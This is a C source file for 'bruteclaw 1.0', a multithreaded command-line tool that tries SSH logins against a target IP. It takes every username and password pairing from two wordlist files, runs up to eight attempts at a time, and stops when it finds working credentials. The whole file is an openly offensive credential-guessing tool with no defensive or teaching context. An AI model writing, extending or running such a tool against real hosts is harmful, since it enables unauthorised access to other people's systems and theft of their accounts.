#include "../../lib/sshlib.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define MAX_THREADS 8

typedef struct {
    char ip[64];
    char username[128];
    char password[128];
} BruteJob;

void *worker(void *arg) {
    BruteJob *job = (BruteJob *)arg;

    SSHConnection *conn = sshConnect(job->ip, 22, job->username, job->password);
    if (conn) {
        printf("[+] Success: %s:%s\n", job->username, job->password);
        sshDisconnect(conn);
        exit(0); // kill all on first success
    } else {
        // fail
        printf("[-] Failed: %s:%s\n", job->username, job->password);
        pthread_exit(NULL);
    }
}

void bruteForceSSH(const char *targetIP, const char *usernameFilename, const char *passwordFilename) {
    printf("[*] Starting SSH brute force\n");

    FILE *usernameFile = fopen(usernameFilename, "r");
    FILE *passwordFile = fopen(passwordFilename, "r");

    if (!usernameFile || !passwordFile) {
        fprintf(stderr, "[-] Failed to open user or password file\n");
        return;
    }

    char currentUsername[128];
    pthread_t threads[MAX_THREADS];
    int thread_index = 0;

    while (fgets(currentUsername, sizeof(currentUsername), usernameFile) != NULL) {
        strtok(currentUsername, "\n");

        rewind(passwordFile);
        char currentPassword[128];

        // Internal loop for each password
        while (fgets(currentPassword, sizeof(currentPassword), passwordFile) != NULL) {
            strtok(currentPassword, "\n");

            // setup job
            BruteJob *job = malloc(sizeof(BruteJob));
            strncpy(job->ip, targetIP, sizeof(job->ip));
            strncpy(job->username, currentUsername, sizeof(job->username));
            strncpy(job->password, currentPassword, sizeof(job->password));

            // launch thread
            pthread_create(&threads[thread_index], NULL, worker, (void *)job);
            thread_index++;

            // thread pool limiting
            if (thread_index >= MAX_THREADS) {
                for (int i = 0; i < thread_index; i++) {
                    pthread_join(threads[i], NULL);
                }
                thread_index = 0;
            }
        }
    }

    // wait for leftovers
    for (int i = 0; i < thread_index; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(usernameFile);
    fclose(passwordFile);

    printf("[-] Brute complete, no creds found.\n");
}

int main(int argc, char *argv[]) {
    printf("[*] Starting bruteclaw 1.0\n");

    if (argc < 5) {
        printf("Usage: ./bruteclaw <IP> <Username file> <Password file> ssh\n");
        return 1;
    }

    if (strcmp(argv[4], "ssh") == 0) {
        bruteForceSSH(argv[1], argv[2], argv[3]);
    }

    return 0;
}
